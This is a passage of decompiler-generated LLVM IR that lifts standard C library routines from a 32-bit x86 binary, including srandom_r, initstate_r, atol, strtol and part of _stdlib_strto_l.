  %v3_804ac83 = load i32, i32* %v2_804ac83, align 4
  store i32 %v3_804ac83, i32* %ecx.global-to-local, align 4
  %v1_804ac86 = add i32 %tmp3, 16
  %v2_804ac86 = inttoptr i32 %v1_804ac86 to i32*
  %v3_804ac86 = load i32, i32* %v2_804ac86, align 4
  store i32 %v3_804ac86, i32* %edi.global-to-local, align 4
  %v1_804ac89 = inttoptr i32 %v2_804ac81 to i32*
  %v2_804ac89 = load i32, i32* %v1_804ac89, align 4
  store i32 %v2_804ac89, i32* %edx.global-to-local, align 4
  %v2_804ac8b = inttoptr i32 %v3_804ac83 to i32*
  %v3_804ac8b = load i32, i32* %v2_804ac8b, align 4
  %v4_804ac8b = add i32 %v3_804ac8b, %v2_804ac89
  store i32 %v4_804ac8b, i32* %edx.global-to-local, align 4
  store i32 %v4_804ac8b, i32* %v1_804ac89, align 4
  %v0_804ac8f = load i32, i32* %edx.global-to-local, align 4
  %v2_804ac8f = udiv i32 %v0_804ac8f, 2
  %v1_804ac91 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ac91 = inttoptr i32 %v1_804ac91 to i32*
  store i32 %v2_804ac8f, i32* %v2_804ac91, align 4
  %v0_804ac94 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac94 = add i32 %v0_804ac94, 4
  store i32 %v1_804ac94, i32* %eax.global-to-local, align 4
  %v1_804ac97 = load i32, i32* %edi.global-to-local, align 4
  %v7_804ac97 = icmp ult i32 %v1_804ac94, %v1_804ac97
  %v0_804ac99 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ac99 = add i32 %v0_804ac99, 4
  store i32 %v1_804ac99, i32* %edx.global-to-local, align 4
  br i1 %v7_804ac97, label %dec_label_pc_804aca2, label %dec_label_pc_804ac9e

dec_label_pc_804ac9e:                             ; preds = %dec_label_pc_804ac81
  %v0_804ac9e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804ac9e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aca8

dec_label_pc_804aca2:                             ; preds = %dec_label_pc_804ac81
  %v7_804aca2 = icmp ult i32 %v1_804ac99, %v1_804ac97
  br i1 %v7_804aca2, label %dec_label_pc_804aca8, label %dec_label_pc_804aca6

dec_label_pc_804aca6:                             ; preds = %dec_label_pc_804aca2
  %v0_804aca6 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804aca6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804aca8

dec_label_pc_804aca8:                             ; preds = %dec_label_pc_804aca2, %dec_label_pc_804ac9e, %dec_label_pc_804aca6
  %v0_804aca8 = phi i32 [ %v1_804ac94, %dec_label_pc_804aca2 ], [ %v0_804ac9e, %dec_label_pc_804ac9e ], [ %v1_804ac94, %dec_label_pc_804aca6 ]
  %v1_804aca8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804aca8 = inttoptr i32 %v1_804aca8 to i32*
  store i32 %v0_804aca8, i32* %v2_804aca8, align 4
  %v0_804acaa = load i32, i32* %edx.global-to-local, align 4
  %v1_804acaa = load i32, i32* %ebx.global-to-local, align 4
  %v2_804acaa = add i32 %v1_804acaa, 4
  %v3_804acaa = inttoptr i32 %v2_804acaa to i32*
  store i32 %v0_804acaa, i32* %v3_804acaa, align 4
  br label %dec_label_pc_804acad

dec_label_pc_804acad:                             ; preds = %dec_label_pc_804ac6a, %dec_label_pc_804aca8
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804acaf = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804acaf, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804ac75, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804acad, { 1, 0 }
  uselistorder label %dec_label_pc_804aca8, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i64, align 8
  %stack_var_-16 = alloca i32, align 4
  %v0_804acb4 = load i32, i32* @ebp, align 4
  %v0_804acb5 = load i32, i32* @edi, align 4
  %v0_804acb6 = load i32, i32* @esi, align 4
  %v0_804acb7 = load i32, i32* @ebx, align 4
  store i32 %v0_804acb7, i32* %stack_var_-16, align 4
  %v4_804acbb = trunc i64 %arg1 to i32
  store i32 %v4_804acbb, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v1_804acc3 = add i32 %arg2, 12
  %v2_804acc3 = inttoptr i32 %v1_804acc3 to i8*
  %v3_804acc3 = load i8, i8* %v2_804acc3, align 1
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v6_804acd3 = icmp ugt i8 %v3_804acc3, 4
  br i1 %v6_804acd3, label %dec_label_pc_804ad4a, label %dec_label_pc_804acd5

dec_label_pc_804acd5:                             ; preds = %entry
  %v1_804acd5 = add i32 %arg2, 8
  %v2_804acd5 = inttoptr i32 %v1_804acd5 to i32*
  %v3_804acd5 = load i32, i32* %v2_804acd5, align 4
  store i32 %v3_804acd5, i32* %ebx.global-to-local, align 4
  %v1_804acd8 = icmp eq i32 %v4_804acbb, 0
  %v1_804acda = icmp eq i1 %v1_804acd8, false
  br i1 %v1_804acda, label %dec_label_pc_804acde, label %dec_label_pc_804acdc

dec_label_pc_804acdc:                             ; preds = %dec_label_pc_804acd5
  %v1_804acdc = and i32 %v4_804acbb, -256
  %v2_804acdc = or i32 %v1_804acdc, 1
  store i32 %v2_804acdc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804acde

dec_label_pc_804acde:                             ; preds = %dec_label_pc_804acd5, %dec_label_pc_804acdc
  %v0_804acde = phi i32 [ %v4_804acbb, %dec_label_pc_804acd5 ], [ %v2_804acdc, %dec_label_pc_804acdc ]
  %v2_804acde = inttoptr i32 %v3_804acd5 to i32*
  store i32 %v0_804acde, i32* %v2_804acde, align 4
  %v4_804ace0 = icmp eq i8 %v3_804acc3, 0
  br i1 %v4_804ace0, label %dec_label_pc_804ad48, label %dec_label_pc_804ace7

dec_label_pc_804ace7:                             ; preds = %dec_label_pc_804acde
  %v0_804ace7 = load i32, i32* @esi, align 4
  %v1_804ace7 = add i32 %v0_804ace7, 13
  %v2_804ace7 = inttoptr i32 %v1_804ace7 to i8*
  %v3_804ace7 = load i8, i8* %v2_804ace7, align 1
  %v4_804aceb = sext i8 %v3_804ace7 to i64
  store i64 %v4_804aceb, i64* %stack_var_-32, align 8
  %v0_804acee = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804acee, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %edi.global-to-local, align 4
  %v5_804ad2428 = icmp sgt i8 %v3_804ace7, 1
  br i1 %v5_804ad2428, label %dec_label_pc_804acf7, label %dec_label_pc_804ad26

dec_label_pc_804acf7:                             ; preds = %dec_label_pc_804ace7, %dec_label_pc_804acf7.dec_label_pc_804acf7_crit_edge
  %v0_804ad1b = phi i32 [ %v0_804ad1b.pre, %dec_label_pc_804acf7.dec_label_pc_804acf7_crit_edge ], [ %v0_804acee, %dec_label_pc_804ace7 ]
  %v0_804acf7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804acfe = ashr i32 %v0_804acf7, 31
  %v2_804acff = zext i32 %v0_804acf7 to i64
  %v4_804acff = zext i32 %v1_804acfe to i64
  %v5_804acff = mul nuw i64 %v4_804acff, 4294967296
  %v6_804acff = or i64 %v5_804acff, %v2_804acff
  %v8_804acff = sdiv i64 %v6_804acff, 127773
  %v9_804acff = trunc i64 %v8_804acff to i32
  %v10_804acff = srem i64 %v6_804acff, 127773
  %v3_804ad05 = mul nsw i64 %v10_804acff, 16807
  %v4_804ad05 = trunc i64 %v3_804ad05 to i32
  %tmp = mul i32 %v9_804acff, -2836
  %v2_804ad11 = add i32 %v4_804ad05, %tmp
  %v13_804ad11 = icmp slt i32 %v2_804ad11, 0
  %v1_804ad13 = icmp eq i1 %v13_804ad11, false
  %v1_804ad15 = add i32 %v2_804ad11, 2147483647
  %v2_804ad11.v1_804ad15 = select i1 %v1_804ad13, i32 %v2_804ad11, i32 %v1_804ad15
  store i32 %v2_804ad11.v1_804ad15, i32* %edx.global-to-local, align 4
  %v1_804ad1b = add i32 %v0_804ad1b, 4
  store i32 %v1_804ad1b, i32* %ecx.global-to-local, align 4
  %v2_804ad1e = inttoptr i32 %v1_804ad1b to i32*
  store i32 %v2_804ad11.v1_804ad15, i32* %v2_804ad1e, align 4
  %v0_804ad20 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ad20 = add i32 %v0_804ad20, 1
  %v3_804ad21.pre = load i64, i64* %stack_var_-32, align 8
  %extract.t12 = trunc i64 %v3_804ad21.pre to i32
  store i32 %v1_804ad20, i32* %edi.global-to-local, align 4
  %v5_804ad24 = icmp slt i32 %v1_804ad20, %extract.t12
  br i1 %v5_804ad24, label %dec_label_pc_804acf7.dec_label_pc_804acf7_crit_edge, label %dec_label_pc_804ad21.dec_label_pc_804ad26_crit_edge

dec_label_pc_804acf7.dec_label_pc_804acf7_crit_edge: ; preds = %dec_label_pc_804acf7
  %v0_804ad1b.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804acf7

dec_label_pc_804ad21.dec_label_pc_804ad26_crit_edge: ; preds = %dec_label_pc_804acf7
  %v0_804ad26.pre = load i32, i32* @esi, align 4
  %v0_804ad2a.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ad26

dec_label_pc_804ad26:                             ; preds = %dec_label_pc_804ad21.dec_label_pc_804ad26_crit_edge, %dec_label_pc_804ace7
  %v0_804ad2a = phi i32 [ %v0_804ad2a.pre, %dec_label_pc_804ad21.dec_label_pc_804ad26_crit_edge ], [ %v0_804acee, %dec_label_pc_804ace7 ]
  %v0_804ad26 = phi i32 [ %v0_804ad26.pre, %dec_label_pc_804ad21.dec_label_pc_804ad26_crit_edge ], [ %v0_804ace7, %dec_label_pc_804ace7 ]
  %v1_804ad26 = add i32 %v0_804ad26, 14
  %v2_804ad26 = inttoptr i32 %v1_804ad26 to i8*
  %v3_804ad26 = load i8, i8* %v2_804ad26, align 1
  %v4_804ad26 = sext i8 %v3_804ad26 to i32
  %v2_804ad2a = mul nsw i32 %v4_804ad26, 4
  %v3_804ad2a = add i32 %v2_804ad2a, %v0_804ad2a
  %v2_804ad2d = inttoptr i32 %v0_804ad26 to i32*
  store i32 %v3_804ad2a, i32* %v2_804ad2d, align 4
  %v0_804ad2f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ad2f = load i32, i32* @esi, align 4
  %v2_804ad2f = add i32 %v1_804ad2f, 4
  %v3_804ad2f = inttoptr i32 %v2_804ad2f to i32*
  store i32 %v0_804ad2f, i32* %v3_804ad2f, align 4
  %v3_804ad32 = load i64, i64* %stack_var_-32, align 8
  %v6_804ad32 = mul nsw i64 %v3_804ad32, 10
  %v7_804ad32 = trunc i64 %v6_804ad32 to i32
  %v2_804ad36 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ad4525 = add i32 %v7_804ad32, -1
  %v9_804ad4526 = icmp slt i32 %v1_804ad4525, 0
  store i32 %v1_804ad4525, i32* @ebx, align 4
  %v1_804ad4627 = icmp eq i1 %v9_804ad4526, false
  br i1 %v1_804ad4627, label %dec_label_pc_804ad3c, label %dec_label_pc_804ad48

dec_label_pc_804ad3c:                             ; preds = %dec_label_pc_804ad26, %dec_label_pc_804ad3c
  %v0_804ad3d = load i32, i32* @esi, align 4
  %v2_804ad3e = inttoptr i32 %v0_804ad3d to i32*
  %v3_804ad3e = call i32 @__GI_random_r(i32* %v2_804ad3e, i32 %v2_804ad36)
  %v0_804ad45.pre = load i32, i32* @ebx, align 4
  %v1_804ad45 = add i32 %v0_804ad45.pre, -1
  %v9_804ad45 = icmp slt i32 %v1_804ad45, 0
  store i32 %v1_804ad45, i32* @ebx, align 4
  %v1_804ad46 = icmp eq i1 %v9_804ad45, false
  br i1 %v1_804ad46, label %dec_label_pc_804ad3c, label %dec_label_pc_804ad48

dec_label_pc_804ad48:                             ; preds = %dec_label_pc_804ad26, %dec_label_pc_804ad3c, %dec_label_pc_804acde
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_804ad4f.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804ad4a

dec_label_pc_804ad4a:                             ; preds = %entry, %dec_label_pc_804ad48
  %v2_804ad4f = phi i32 [ %v0_804acb7, %entry ], [ %v2_804ad4f.pre, %dec_label_pc_804ad48 ]
  %v0_804ad4a = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_804ad48 ]
  store i32 %v2_804ad4f, i32* @ebx, align 4
  store i32 %v0_804acb6, i32* @esi, align 4
  store i32 %v0_804acb5, i32* @edi, align 4
  store i32 %v0_804acb4, i32* @ebp, align 4
  ret i32 %v0_804ad4a

; uselistorder directives
  uselistorder i32 %v1_804ad45, { 1, 0 }
  uselistorder i32 %v0_804ad26, { 1, 0 }
  uselistorder i32 %v1_804ad20, { 1, 0 }
  uselistorder i32 %v2_804ad11.v1_804ad15, { 1, 0 }
  uselistorder i32 %v2_804ad11, { 2, 1, 0 }
  uselistorder i32 %v0_804acee, { 1, 0, 2 }
  uselistorder i8 %v3_804acc3, { 1, 0 }
  uselistorder i64* %stack_var_-32, { 2, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ad4a, { 1, 0 }
  uselistorder label %dec_label_pc_804ad48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ad3c, { 1, 0 }
  uselistorder label %dec_label_pc_804acf7, { 1, 0 }
  uselistorder label %dec_label_pc_804acde, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-24 = alloca i32, align 4
  %v0_804ad56 = load i32, i32* @esi, align 4
  %v0_804ad57 = load i32, i32* @ebx, align 4
  store i32 %tmp8, i32* @ebp, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp16 = icmp ult i32 %arg3, 128
  br i1 %tmp16, label %dec_label_pc_804ad75, label %dec_label_pc_804ad69

dec_label_pc_804ad69:                             ; preds = %entry
  %v2_804ad69 = icmp ult i32 %arg3, 256
  %v1_804ad70 = select i1 %v2_804ad69, i32 5, i32 4
  store i32 %v1_804ad70, i32* @ebx, align 4
  br label %dec_label_pc_804ad8b

dec_label_pc_804ad75:                             ; preds = %entry
  %v6_804ad78 = icmp ugt i32 %arg3, 31
  br i1 %v6_804ad78, label %dec_label_pc_804ad83, label %dec_label_pc_804ad7a

dec_label_pc_804ad7a:                             ; preds = %dec_label_pc_804ad75
  store i32 0, i32* @ebx, align 4
  %v6_804ad7f = icmp ugt i32 %arg3, 7
  br i1 %v6_804ad7f, label %dec_label_pc_804ad8b, label %dec_label_pc_804addb

dec_label_pc_804ad83:                             ; preds = %dec_label_pc_804ad75
  %v2_804ad83 = icmp ult i32 %arg3, 64
  %v1_804ad88 = select i1 %v2_804ad83, i32 3, i32 2
  store i32 %v1_804ad88, i32* @ebx, align 4
  br label %dec_label_pc_804ad8b

dec_label_pc_804ad8b:                             ; preds = %dec_label_pc_804ad7a, %dec_label_pc_804ad69, %dec_label_pc_804ad83
  %v0_804ad98 = phi i32 [ 0, %dec_label_pc_804ad7a ], [ %v1_804ad70, %dec_label_pc_804ad69 ], [ %v1_804ad88, %dec_label_pc_804ad83 ]
  %v1_804ad8b = add i32 %v0_804ad98, ptrtoint (i8** @global_var_8050e65.62 to i32)
  %v2_804ad8b = inttoptr i32 %v1_804ad8b to i8*
  %v3_804ad8b = load i8, i8* %v2_804ad8b, align 1
  %v4_804ad8b = sext i8 %v3_804ad8b to i32
  store i32 %v4_804ad8b, i32* %eax.global-to-local, align 4
  %v1_804ad92 = add i32 %v0_804ad98, ptrtoint (i8** @global_var_8050e60.63 to i32)
  %v2_804ad92 = inttoptr i32 %v1_804ad92 to i8*
  %v3_804ad92 = load i8, i8* %v2_804ad92, align 1
  %v4_804ad92 = zext i8 %v3_804ad92 to i32
  %v5_804ad92 = load i32, i32* @edx, align 4
  %v6_804ad92 = and i32 %v5_804ad92, -256
  %v7_804ad92 = or i32 %v6_804ad92, %v4_804ad92
  store i32 %v7_804ad92, i32* %edx.global-to-local, align 4
  %v1_804ad98 = trunc i32 %v0_804ad98 to i8
  %v3_804ad98 = add i32 %arg4, 12
  %v4_804ad98 = inttoptr i32 %v3_804ad98 to i8*
  store i8 %v1_804ad98, i8* %v4_804ad98, align 1
  %v0_804ad9b = load i32, i32* %edx.global-to-local, align 4
  %v1_804ad9b = trunc i32 %v0_804ad9b to i8
  %v2_804ad9b = load i32, i32* @edi, align 4
  %v3_804ad9b = add i32 %v2_804ad9b, 14
  %v4_804ad9b = inttoptr i32 %v3_804ad9b to i8*
  store i8 %v1_804ad9b, i8* %v4_804ad9b, align 1
  %v0_804ad9e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad9e = trunc i32 %v0_804ad9e to i8
  %v2_804ad9e = load i32, i32* @edi, align 4
  %v3_804ad9e = add i32 %v2_804ad9e, 13
  %v4_804ad9e = inttoptr i32 %v3_804ad9e to i8*
  store i8 %v1_804ad9e, i8* %v4_804ad9e, align 1
  %v0_804ada1 = load i32, i32* @ebp, align 4
  %v1_804ada1 = add i32 %v0_804ada1, 4
  store i32 %v1_804ada1, i32* @esi, align 4
  %v1_804ada4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ada4 = mul i32 %v1_804ada4, 4
  %v3_804ada4 = add i32 %v2_804ada4, %v1_804ada1
  store i32 %v3_804ada4, i32* %eax.global-to-local, align 4
  %v1_804ada7 = load i32, i32* @edi, align 4
  %v2_804ada7 = add i32 %v1_804ada7, 16
  %v3_804ada7 = inttoptr i32 %v2_804ada7 to i32*
  store i32 %v3_804ada4, i32* %v3_804ada7, align 4
  %v0_804adaa = load i32, i32* @esi, align 4
  %v1_804adaa = load i32, i32* @edi, align 4
  %v2_804adaa = add i32 %v1_804adaa, 8
  %v3_804adaa = inttoptr i32 %v2_804adaa to i32*
  store i32 %v0_804adaa, i32* %v3_804adaa, align 4
  %v0_804adad = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804adb2 = sext i32 %arg1 to i64
  %v3_804adb2 = call i32 @srandom_r(i64 %v2_804adb2, i32 %v0_804adad)
  %v0_804adb7 = load i32, i32* @ebp, align 4
  %v1_804adb7 = inttoptr i32 %v0_804adb7 to i32*
  store i32 0, i32* %v1_804adb7, align 4
  store i32 %v0_804adad, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804adc2 = load i32, i32* @ebx, align 4
  %v1_804adc2 = icmp eq i32 %v0_804adc2, 0
  br i1 %v1_804adc2, label %dec_label_pc_804adf4, label %dec_label_pc_804adc6

dec_label_pc_804adc6:                             ; preds = %dec_label_pc_804ad8b
  %v0_804adc6 = load i32, i32* @edi, align 4
  %v1_804adc6 = add i32 %v0_804adc6, 4
  %v2_804adc6 = inttoptr i32 %v1_804adc6 to i32*
  %v3_804adc6 = load i32, i32* %v2_804adc6, align 4
  %v1_804adc9 = load i32, i32* @esi, align 4
  %v2_804adc9 = sub i32 %v3_804adc6, %v1_804adc9
  %v2_804adcb = sdiv i32 %v2_804adc9, 4
  %v3_804adce = mul i32 %v2_804adcb, 5
  %v2_804add1 = add i32 %v3_804adce, %v0_804adc2
  %v1_804add4 = load i32, i32* @ebp, align 4
  %v2_804add4 = inttoptr i32 %v1_804add4 to i32*
  store i32 %v2_804add1, i32* %v2_804add4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804adf4

dec_label_pc_804addb:                             ; preds = %dec_label_pc_804ad7a
  %v1_804addb = call i32 @__GI___errno_location(i32 %v0_804ad57)
  store i32 %v1_804addb, i32* %eax.global-to-local, align 4
  %v1_804ade0 = inttoptr i32 %v1_804addb to i32*
  store i32 22, i32* %v1_804ade0, align 4
  %v0_804ade6 = load i32, i32* %stack_var_-24, align 4
  %v1_804ade6 = call i32 @__GI___errno_location(i32 %v0_804ade6)
  %v1_804adeb = inttoptr i32 %v1_804ade6 to i32*
  store i32 22, i32* %v1_804adeb, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804adf4

dec_label_pc_804adf4:                             ; preds = %dec_label_pc_804ad8b, %dec_label_pc_804adc6, %dec_label_pc_804addb
  %v0_804adf8 = phi i32 [ 0, %dec_label_pc_804ad8b ], [ 0, %dec_label_pc_804adc6 ], [ -1, %dec_label_pc_804addb ]
  store i32 %v0_804ad56, i32* @esi, align 4
  ret i32 %v0_804adf8

; uselistorder directives
  uselistorder i32 %v0_804ad98, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 ptrtoint (i8** @global_var_8050e60.63 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8050e65.62 to i32), { 1, 0 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804adf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ad8b, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804ae04 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804ae04
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804ae1e = inttoptr i32 %arg1 to i8*
  %v5_804ae1e = call i32 @_stdlib_strto_l(i8* %v4_804ae1e, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804ae1e
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ae2b = load i32, i32* @ebx, align 4
  store i32 %v0_804ae2b, i32* %stack_var_-16, align 4
  %v4_804ae2f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ae2f, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v4_804ae3c.pre = load i32, i32* @ecx, align 4
  %v0_804ae41.pre = load i32, i32* @global_var_8053338, align 8
  store i32 %v4_804ae2f, i32* %ebx.global-to-local, align 4
  %v2_804ae3c49 = load i8, i8* %arg1, align 1
  %v3_804ae3c50 = zext i8 %v2_804ae3c49 to i32
  %v5_804ae3c51 = and i32 %v4_804ae3c.pre, -256
  %v6_804ae3c52 = or i32 %v3_804ae3c50, %v5_804ae3c51
  store i32 %v0_804ae41.pre, i32* %eax.global-to-local, align 4
  %v2_804ae4653 = mul nuw nsw i32 %v3_804ae3c50, 2
  %v3_804ae4654 = add i32 %v2_804ae4653, %v0_804ae41.pre
  %v4_804ae4655 = inttoptr i32 %v3_804ae4654 to i8*
  %v5_804ae4656 = load i8, i8* %v4_804ae4655, align 1
  %v6_804ae4657 = and i8 %v5_804ae4656, 32
  %v7_804ae4658 = icmp eq i8 %v6_804ae4657, 0
  %v1_804ae4a59 = icmp eq i1 %v7_804ae4658, false
  br i1 %v1_804ae4a59, label %dec_label_pc_804ae3b, label %dec_label_pc_804ae4c

dec_label_pc_804ae3b:                             ; preds = %entry, %dec_label_pc_804ae3b
  %v6_804ae3c61 = phi i32 [ %v6_804ae3c, %dec_label_pc_804ae3b ], [ %v6_804ae3c52, %entry ]
  %v0_804ae3b60 = phi i32 [ %v1_804ae3b, %dec_label_pc_804ae3b ], [ %v4_804ae2f, %entry ]
  %v1_804ae3b = add i32 %v0_804ae3b60, 1
  store i32 %v1_804ae3b, i32* %ebx.global-to-local, align 4
  %v1_804ae3c = inttoptr i32 %v1_804ae3b to i8*
  %v2_804ae3c = load i8, i8* %v1_804ae3c, align 1
  %v3_804ae3c = zext i8 %v2_804ae3c to i32
  %v5_804ae3c = and i32 %v6_804ae3c61, -256
  %v6_804ae3c = or i32 %v3_804ae3c, %v5_804ae3c
  store i32 %v0_804ae41.pre, i32* %eax.global-to-local, align 4
  %v2_804ae46 = mul nuw nsw i32 %v3_804ae3c, 2
  %v3_804ae46 = add i32 %v2_804ae46, %v0_804ae41.pre
  %v4_804ae46 = inttoptr i32 %v3_804ae46 to i8*
  %v5_804ae46 = load i8, i8* %v4_804ae46, align 1
  %v6_804ae46 = and i8 %v5_804ae46, 32
  %v7_804ae46 = icmp eq i8 %v6_804ae46, 0
  %v1_804ae4a = icmp eq i1 %v7_804ae46, false
  br i1 %v1_804ae4a, label %dec_label_pc_804ae3b, label %dec_label_pc_804ae4c

dec_label_pc_804ae4c:                             ; preds = %dec_label_pc_804ae3b, %entry
  %v0_804ae3b.lcssa = phi i32 [ %v4_804ae2f, %entry ], [ %v1_804ae3b, %dec_label_pc_804ae3b ]
  %v2_804ae3c.lcssa = phi i8 [ %v2_804ae3c49, %entry ], [ %v2_804ae3c, %dec_label_pc_804ae3b ]
  %tmp40 = trunc i32 %arg4 to i8
  %v10_804ae4c = icmp eq i8 %v2_804ae3c.lcssa, 43
  br i1 %v10_804ae4c, label %dec_label_pc_804ae61, label %dec_label_pc_804ae51

dec_label_pc_804ae51:                             ; preds = %dec_label_pc_804ae4c
  store i32 0, i32* %ebp.global-to-local, align 4
  %v10_804ae53 = icmp eq i8 %v2_804ae3c.lcssa, 45
  %v1_804ae56 = icmp eq i1 %v10_804ae53, false
  br i1 %v1_804ae56, label %dec_label_pc_804ae62, label %dec_label_pc_804ae61

dec_label_pc_804ae61:                             ; preds = %dec_label_pc_804ae4c, %dec_label_pc_804ae51
  %storemerge3 = phi i32 [ 1, %dec_label_pc_804ae51 ], [ 0, %dec_label_pc_804ae4c ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_804ae61 = add i32 %v0_804ae3b.lcssa, 1
  store i32 %v1_804ae61, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ae62

dec_label_pc_804ae62:                             ; preds = %dec_label_pc_804ae51, %dec_label_pc_804ae61
  %v0_804ae74 = phi i32 [ %v0_804ae3b.lcssa, %dec_label_pc_804ae51 ], [ %v1_804ae61, %dec_label_pc_804ae61 ]
  %v1_804ae64 = and i32 %arg3, -17
  %v2_804ae64 = icmp eq i32 %v1_804ae64, 0
  %v1_804ae6a = icmp eq i1 %v2_804ae64, false
  br i1 %v1_804ae6a, label %dec_label_pc_804ae90, label %dec_label_pc_804ae6c

dec_label_pc_804ae6c:                             ; preds = %dec_label_pc_804ae62
  %v1_804ae6c = add i32 %arg3, 10
  store i32 %v1_804ae6c, i32* %esi.global-to-local, align 4
  %v1_804ae6f = inttoptr i32 %v0_804ae74 to i8*
  %v2_804ae6f = load i8, i8* %v1_804ae6f, align 1
  %v8_804ae6f = icmp eq i8 %v2_804ae6f, 48
  %v1_804ae72 = icmp eq i1 %v8_804ae6f, false
  br i1 %v1_804ae72, label %dec_label_pc_804ae86, label %dec_label_pc_804ae74

dec_label_pc_804ae74:                             ; preds = %dec_label_pc_804ae6c
  %v1_804ae74 = add i32 %v0_804ae74, 1
  store i32 %v1_804ae74, i32* %ebx.global-to-local, align 4
  %v1_804ae75 = add i32 %arg3, 8
  store i32 %v1_804ae75, i32* %esi.global-to-local, align 4
  %v1_804ae78 = inttoptr i32 %v1_804ae74 to i8*
  %v2_804ae78 = load i8, i8* %v1_804ae78, align 1
  %v3_804ae78 = zext i8 %v2_804ae78 to i32
  %v5_804ae78 = and i32 %v0_804ae41.pre, -256
  %v6_804ae78 = or i32 %v5_804ae78, %v3_804ae78
  %v1_804ae7a = or i32 %v6_804ae78, 32
  %v3_804ae7a = trunc i32 %v1_804ae7a to i8
  store i32 %v1_804ae7a, i32* %eax.global-to-local, align 4
  %v10_804ae7f = icmp eq i8 %v3_804ae7a, 120
  %v1_804ae81 = icmp eq i1 %v10_804ae7f, false
  br i1 %v1_804ae81, label %dec_label_pc_804ae86, label %dec_label_pc_804ae83

dec_label_pc_804ae83:                             ; preds = %dec_label_pc_804ae74
  %v2_804ae83 = mul i32 %v1_804ae75, 2
  store i32 %v2_804ae83, i32* %esi.global-to-local, align 4
  %v1_804ae85 = add i32 %v0_804ae74, 2
  store i32 %v1_804ae85, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ae86

dec_label_pc_804ae86:                             ; preds = %dec_label_pc_804ae74, %dec_label_pc_804ae6c, %dec_label_pc_804ae83
